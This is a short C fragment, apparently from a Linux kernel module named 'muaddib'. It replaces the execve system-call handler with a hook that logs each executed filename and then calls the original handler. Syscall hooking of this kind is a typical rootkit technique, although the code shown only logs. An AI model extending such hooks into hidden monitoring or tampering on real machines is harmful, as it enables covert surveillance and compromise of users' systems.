#define MAX_FILENAME_SIZE 100
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*og_execve)(const struct pt_regs *);

asmlinkage int muaddib_execve(const struct pt_regs *regs){
    char __user *filename = (char *)regs->di;
    char **argv = (char **)regs->si;
    char filename_in_kernel[MAX_FILENAME_SIZE] = {0};
    int leng = strnlen_user(filename, MAX_FILENAME_SIZE);
    long copy = strncpy_from_user(filename_in_kernel, filename, leng);
    printk(KERN_INFO "muaddib: filename: %s", filename_in_kernel);
    return og_execve(regs);
}
#endif
